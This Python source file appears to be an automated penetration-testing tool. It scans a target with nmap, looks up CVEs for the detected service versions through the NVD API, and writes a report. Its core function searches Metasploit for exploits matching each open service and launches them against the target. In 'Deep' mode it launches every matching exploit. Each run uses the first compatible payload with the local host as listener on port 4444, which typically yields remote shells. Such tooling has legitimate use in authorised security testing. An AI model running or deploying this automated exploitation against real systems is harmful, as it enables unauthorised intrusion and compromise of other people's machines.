import os
import datetime
import re
import subprocess
import socket
import requests
from pymetasploit3.msfrpc import MsfRpcClient
from prettytable import PrettyTable
import textwrap
import concurrent.futures


def get_local_ip():
    """
    Detects the local IP address of the host.
    """
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        print(f"Error getting local IP: {e}")
        return None


def nmap_scan(target, start_port=1, end_port=65535):
    """
    Scans the target for open ports and services using Nmap.
    """
    try:
        print(
            f"\n[+] Scanning {target} for open ports and services from {start_port} to {end_port}...\n")
        command = ["nmap", "-sV", f"-p{start_port}-{end_port}", target]
        result = subprocess.run(
            command, capture_output=True, text=True, check=True
        )
        open_ports = []
        for line in result.stdout.splitlines():
            if "open" in line:
                parts = line.split()
                port = parts[0].split('/')[0]
                service = parts[2] if len(parts) > 2 else "unknown"
                version = " ".join(parts[3:]) if len(parts) > 3 else "-"
                open_ports.append({
                    "port": port,
                    "service": service,
                    "version": version
                })
        return open_ports
    except subprocess.CalledProcessError as e:
        print(f"Nmap scan failed: {e}")
        return []


def connect_to_metasploit(password="your_password"):
    """
    Connects to the Metasploit RPC server using PyMetasploit3.
    """
    try:
        client = MsfRpcClient(password, port=55552)
        print("\n[+] Connected to Metasploit Framework.")
        return client
    except Exception as e:
        print(f"[-] Failed to connect to Metasploit RPC server: {e}")
        return None


def search_and_run_exploit(client, service, target_ip, port, local_ip, mode='Lite'):
    """
    Searches for exploits in Metasploit and attempts to run them based on the mode.
    Dynamically validates and sets required options.
    Returns a list of tuples: [(module_name, success), ...].
    """
    print(
        f"INFO [Exploit Search]: Starting for service={service}, target={target_ip}:{port}, mode={mode}")

    EXPLOIT_TIMEOUT_SECONDS = 60  # Timeout for each exploit execution attempt

    exploits = client.modules.search(service)
    results = []  # Store results for multiple exploits if needed

    if not exploits:
        print(
            f"WARN [Exploit Search]: No exploits found via search for {service} on port {port}.")
        return [(None, False)]  # Return list with one failure entry

    # Filter for actual exploits
    exploit_modules = [e for e in exploits if e["type"] == "exploit"]

    if not exploit_modules:
        print(
            f"WARN [Exploit Search]: No modules of type 'exploit' found for {service}.")
        return [(None, False)]  # Return list with one failure entry

    # Determine which modules to run based on mode
    modules_to_run = []
    if mode == 'Lite':
        # Try to find a Linux exploit first if possible for Lite mode, otherwise default to first
        linux_exploit = next(
            (e for e in exploit_modules if 'linux/' in e["fullname"] or 'unix/' in e["fullname"]), None)
        modules_to_run = [linux_exploit] if linux_exploit else [
            exploit_modules[0]]
        print(
            f"INFO [Exploit Search]: Lite mode selected. Attempting module: {modules_to_run[0]['fullname']}")
    elif mode == 'Deep':
        modules_to_run = exploit_modules  # Take all of them
        print(
            f"INFO [Exploit Search]: Deep mode selected. Found {len(exploit_modules)} exploit module(s). Will attempt all.")
    else:
        print(
            f"WARN [Exploit Search]: Unknown testing mode '{mode}'. Defaulting to Lite.")
        modules_to_run = [exploit_modules[0]]

    # Use ThreadPoolExecutor to manage exploit execution with timeouts
    # Run one exploit at a time
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        exploit_counter = 0
        total_exploits_to_run = len(modules_to_run)
        for exploit_info in modules_to_run:
            exploit_counter += 1
            module_name = exploit_info["fullname"]
            print(
                f"\nINFO [Exploit Run {exploit_counter}/{total_exploits_to_run}]: Attempting {module_name}...")

            try:
                # Load the exploit module
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Loading module {module_name}...")
                exploit = client.modules.use("exploit", module_name)
                print(f"DEBUG [Exploit Run {exploit_counter}]: Module loaded.")

                # --- Set exploit options (RHOSTS, RPORT) ---
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Setting options...")
                if "RHOSTS" not in exploit.options:
                    print(
                        f"WARN [Exploit Run {exploit_counter}]: Exploit {module_name} missing RHOSTS. Skipping.")
                    results.append((module_name, False))
                    continue  # Skip this exploit
                exploit["RHOSTS"] = target_ip

                if "RPORT" not in exploit.options:
                    print(
                        f"WARN [Exploit Run {exploit_counter}]: Exploit {module_name} missing RPORT. Skipping.")
                    results.append((module_name, False))
                    continue  # Skip if RPORT isn't available
                exploit["RPORT"] = port
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Exploit options set (RHOSTS={target_ip}, RPORT={port}).")

                # --- Find and set payload ---
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Finding payloads...")
                supported_payloads = exploit.payloads
                if not supported_payloads:
                    print(
                        f"WARN [Exploit Run {exploit_counter}]: No compatible payloads found for {module_name}. Skipping.")
                    results.append((module_name, False))
                    continue  # Skip if no payloads
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Found {len(supported_payloads)} payloads: {supported_payloads[:5]}... (showing first 5)")

                # Use the first compatible payload
                payload_name = supported_payloads[0]
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Selecting payload {payload_name}...")
                payload = client.modules.use("payload", payload_name)
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Payload {payload_name} loaded.")

                # --- Set payload options (LHOST, LPORT) ---
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Setting payload options...")
                lhost_set, lport_set = False, False
                default_lport = 4444  # Default LPORT
                if "LHOST" in payload.options:
                    payload["LHOST"] = local_ip
                    lhost_set = True
                else:
                    print(
                        f"WARN [Exploit Run {exploit_counter}]: Payload {payload_name} does not support LHOST.")

                if "LPORT" in payload.options:
                    payload["LPORT"] = default_lport
                    lport_set = True
                else:
                    print(
                        f"WARN [Exploit Run {exploit_counter}]: Payload {payload_name} does not support LPORT.")
                print(
                    f"DEBUG [Exploit Run {exploit_counter}]: Payload options set (LHOST={local_ip if lhost_set else 'N/A'}, LPORT={default_lport if lport_set else 'N/A'}).")

                # --- Execute the exploit with timeout ---
                print(
                    f"INFO [Exploit Run {exploit_counter}]: Submitting execution for {module_name} with payload {payload_name} (Timeout: {EXPLOIT_TIMEOUT_SECONDS}s)...")
                future = executor.submit(exploit.execute, payload=payload)

                try:
                    job_info = future.result(timeout=EXPLOIT_TIMEOUT_SECONDS)
                    print(
                        f"DEBUG [Exploit Run {exploit_counter}]: Execution finished within timeout. Result: {job_info}")

                    if job_info and 'job_id' in job_info:
                        # Check if job_id is None, which some exploits might return on sync failure
                        if job_info['job_id'] is not None:
                            print(
                                f"SUCCESS [Exploit Run {exploit_counter}]: Exploit {module_name} launched as job {job_info['job_id']}.")
                            results.append((module_name, True))
                        else:
                            print(
                                f"FAIL [Exploit Run {exploit_counter}]: Exploit {module_name} execution returned job_id=None. Likely failed.")
                            results.append((module_name, False))
                    else:
                        print(
                            f"FAIL [Exploit Run {exploit_counter}]: Exploit {module_name} execution failed or did not return valid job info. Details: {job_info}")
                        results.append((module_name, False))

                except concurrent.futures.TimeoutError:
                    print(
                        f"FAIL [Exploit Run {exploit_counter}]: Exploit {module_name} timed out after {EXPLOIT_TIMEOUT_SECONDS} seconds.")
                    results.append((module_name, False))
                    # Optional: Try to cancel the future if possible/needed, though job might still be running in msf
                    # future.cancel()
                except Exception as exec_e:
                    print(
                        f"ERROR [Exploit Run {exploit_counter}]: Exception during future.result() for {module_name}: {exec_e}")
                    results.append((module_name, False))

            except Exception as e:
                print(
                    f"ERROR [Exploit Run {exploit_counter}]: General exception setting up or preparing exploit {module_name}: {e}")
                results.append((module_name, False))

            print(
                f"INFO [Exploit Run {exploit_counter}/{total_exploits_to_run}]: Finished attempt for {module_name}.")

    if not results:  # If no exploits were even attempted
        print(
            f"WARN [Exploit Search]: No exploits were actually attempted for {service} on {target_ip}:{port}.")
        return [(None, False)]

    print(
        f"INFO [Exploit Search]: Finished all attempts for service={service}, target={target_ip}:{port}. Returning {len(results)} results.")
    return results


def clean_version_info(service, version):
    """
    Cleans version string by removing extra characters and formatting it.
    Helps improve accuracy when querying the NVD API.
    """
    cleaned_version = re.sub(r'\([^)]*\)', '', version).strip()
    if '-' in cleaned_version:
        cleaned_version = cleaned_version.split('-')[0].strip()

    # Limit HTTP to first three tokens to avoid verbose strings
    if service.lower() == "http":
        parts = cleaned_version.split()
        if len(parts) >= 3:
            cleaned_version = " ".join(parts[:3])
    elif service.lower() == "ftp":
        return cleaned_version
    return cleaned_version


def query_nvd_api(keyword, api_key):
    """
    Query the NVD API using the provided keyword and API key.
    Tries a fallback (using only the service name) if no results are found.
    Debug prints are added for troubleshooting.
    """
    url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    params = {"keywordSearch": keyword, "resultsPerPage": 1}
    headers = {"apiKey": api_key}
    try:
        print(f"DEBUG: Querying NVD API with keyword: '{keyword}'")
        response = requests.get(url, params=params, headers=headers)
        print(f"DEBUG: Full URL: {response.url}")
        print(f"DEBUG: NVD API response status code: {response.status_code}")
        if response.status_code != 200:
            print(
                f"ERROR: NVD API returned status code {response.status_code}: {response.text}")
            return None
        data = response.json()
        if data.get("vulnerabilities"):
            vuln = data["vulnerabilities"][0]["cve"]
            if "cvssMetricV31" in vuln["metrics"]:
                cvss_info = vuln["metrics"]["cvssMetricV31"][0]["cvssData"]
                severity = cvss_info["baseSeverity"]
                score = cvss_info["baseScore"]
            else:
                severity = "N/A"
                score = "N/A"
            result = {
                "id": vuln["id"],
                "description": vuln["descriptions"][0]["value"],
                "severity": severity,
                "score": score,
                "cwe": vuln["weaknesses"][0]["description"][0]["value"] if vuln.get("weaknesses") else "N/A",
                "reference": vuln["references"][0]["url"] if vuln.get("references") else "N/A"
            }
            print(f"DEBUG: Vulnerability found: {result['id']}")
            return result
        else:
            print(f"DEBUG: No vulnerabilities found for keyword: '{keyword}'")
            if " " in keyword:
                service_name = keyword.split()[0]
                print(
                    f"DEBUG: Trying fallback query with service name only: '{service_name}'")
                params["keywordSearch"] = service_name
                fallback_response = requests.get(
                    url, params=params, headers=headers)
                print(f"DEBUG: Fallback Full URL: {fallback_response.url}")
                print(
                    f"DEBUG: Fallback response status code: {fallback_response.status_code}")
                if fallback_response.status_code == 200:
                    fallback_data = fallback_response.json()
                    if fallback_data.get("vulnerabilities"):
                        vuln = fallback_data["vulnerabilities"][0]["cve"]
                        if "cvssMetricV31" in vuln["metrics"]:
                            cvss_info = vuln["metrics"]["cvssMetricV31"][0]["cvssData"]
                            severity = cvss_info["baseSeverity"]
                            score = cvss_info["baseScore"]
                        else:
                            severity = "N/A"
                            score = "N/A"
                        result = {
                            "id": vuln["id"],
                            "description": vuln["descriptions"][0]["value"],
                            "severity": severity,
                            "score": score,
                            "cwe": vuln["weaknesses"][0]["description"][0]["value"] if vuln.get("weaknesses") else "N/A",
                            "reference": vuln["references"][0]["url"] if vuln.get("references") else "N/A"
                        }
                        print(
                            f"DEBUG: Fallback vulnerability found: {result['id']}")
                        return result
                    else:
                        print(
                            f"DEBUG: No vulnerabilities found in fallback query for '{service_name}'")
                        return None
                else:
                    print(
                        f"ERROR: Fallback query failed with status {fallback_response.status_code}")
                    return None
            return None
    except Exception as e:
        print(f"Error querying NVD API: {e}")
        return None


def format_description(nvd_data):
    """
    Formats vulnerability data from NVD API for readable CLI or web output.
    Includes emojis for severity cues and wraps long lines for clean alignment.
    Skips any fields marked as 'N/A'.
    """
    lines = []
    # Append relevant fields only if they exist and aren't N/A

    if nvd_data.get("id") and nvd_data["id"] != "N/A":
        lines.append(f"💼 CVE: {nvd_data['id']}")
    if nvd_data.get("severity") and nvd_data["severity"] != "N/A":
        emoji = {
            "CRITICAL": "💥",
            "HIGH": "🛑",
            "MEDIUM": "⚠️",
            "LOW": "🔎"
        }.get(nvd_data["severity"].upper(), "❓")
        lines.append(f"{emoji} Severity: {nvd_data['severity']}")
    if nvd_data.get("score") and nvd_data["score"] != "N/A":
        lines.append(f"🎯 Score: {nvd_data['score']}")
    if nvd_data.get("cwe") and nvd_data["cwe"] != "N/A":
        lines.append(f"🧬 CWE: {nvd_data['cwe']}")
    if nvd_data.get("description") and nvd_data["description"] != "N/A":
        desc = nvd_data['description'].replace('\n', ' ').strip()
        lines.append(f"📝 {desc}")
    if nvd_data.get("reference") and nvd_data["reference"] != "N/A":
        lines.append(f"🔗 {nvd_data['reference']}")

    # Wrap each line to keep within column width
    wrapped_lines = []
    for line in lines:
        wrapped_lines.extend(textwrap.wrap(line, width=70))

    return "\n".join(wrapped_lines)


def port_exploit_report(directory, target_ips, nmap_table, results, api_key):
    """
    Writes a formatted vulnerability and exploitation report to a timestamped text file.

    Args:
        directory (str): Output directory path where the report will be saved.
        target_ips (list): List of scanned IP addresses.
        nmap_table (dict): Nmap scan results for each IP.
        results (dict): Exploitation attempt results for each IP.
    """
    # Ensure the reports directory exists
    os.makedirs(directory, exist_ok=True)

    # Generate a sanitized timestamp for the filename
    raw_timestamp = datetime.datetime.now().strftime("%d_%m_%y-%H_%M")
    file_name = os.path.join(directory, f"{raw_timestamp}.txt")

    try:
        with open(file_name, "w") as report_file:
            report_file.write(
                f"Scan Time: {datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')}\n"
            )
            report_file.write("=" * 100 + "\n")

            for ip in target_ips:
                if ip not in nmap_table or ip not in results:
                    continue

                report_file.write(f"\nIP Address: {ip}\n")

                # Scan Results Table
                report_file.write("Scan Results\n")

                table = PrettyTable(
                    ["Port", "Service", "Version", "Description"])
                table.align = "l"
                table.max_width["Description"] = 70

                for result in nmap_table[ip]:
                    port = result.get('port', '')
                    service = result.get('service', '')
                    version = result.get('version', '')

                    if not version or version == "-":
                        description = "No version data provided."
                    else:
                        # Clean version string and query NVD API
                        clean_version = clean_version_info(service, version)
                        keyword = clean_version if service.lower(
                        ) == "ftp" else f"{service} {clean_version}"
                        nvd_data = query_nvd_api(keyword, api_key=api_key)

                        # Format NVD data if found, or fallback
                        if nvd_data:
                            description = format_description(nvd_data)
                        else:
                            description = "No CVEs found."

                    table.add_row([port, service, version, description])
                    table.add_row(["", "", "", ""])  # separator row

                report_file.write(f"{table}\n")
                report_file.write("-" * 100 + "\n")

                # Exploitation Results Table
                report_file.write("Exploitation Results:\n")
                exploit_table = PrettyTable(
                    ["Service", "Port", "Exploit", "Status"])
                exploit_table.align = "l"

                for res in results[ip]:
                    exploit_table.add_row([
                        res.get("service", ""),
                        res.get("port", ""),
                        res.get("exploit", ""),
                        res.get("status", "")
                    ])

                report_file.write(f"{exploit_table}\n")
                report_file.write("=" * 100 + "\n\n")

    except Exception as e:
        print(f"[-] Failed to write to report file: {e}")
